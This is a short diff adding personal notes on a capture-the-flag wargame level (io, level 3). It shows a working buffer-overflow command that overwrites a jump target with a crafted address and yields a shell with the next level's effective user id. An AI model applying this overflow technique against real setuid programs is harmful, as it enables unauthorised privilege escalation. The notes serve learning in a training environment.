@@ -1,0 +1,8 @@
+Simple buffer overflow allowing us to write 4 bytes (strangely preceded by the app writing 4 'A's. Writing the memory address of where we want the app to jump to seems to make it execute it. Need to understand better where exactly we were overwriting...
+
+level3@io:/levels$ ./level03 12345678901234567890123456789012                                
+Address of hmm: 0x804847f
+level3@io:/levels$ ./level03 12345678901234567890123456789012xxxx`echo -e "\x7f\x84\x04\x08"`
+Win.
+sh-4.1$ id    
+uid=1003(level3) gid=1003(level3) euid=1004(level4) groups=1004(level4),1003(level3),1029(nosu)
